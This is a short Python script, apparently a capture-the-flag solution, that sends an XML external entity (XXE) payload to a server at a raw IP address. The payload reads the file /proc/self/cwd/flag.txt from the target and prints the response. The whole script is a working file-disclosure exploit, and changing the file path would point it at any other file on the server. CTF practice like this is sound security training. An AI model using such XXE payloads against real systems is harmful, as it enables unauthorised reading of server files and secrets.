import requests

print(
	requests.post(
	"http://184.72.87.9:8013/accept",
	data={
	"postXml":
		"""<?xml version="1.0" encoding="UTF-8" standalone="no"?>
		<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///proc/self/cwd/flag.txt"> ]>
		<post author="CTF Participant" id="0" title="Title"><message>&xxe;</message></post>"""
	}
	).text
)
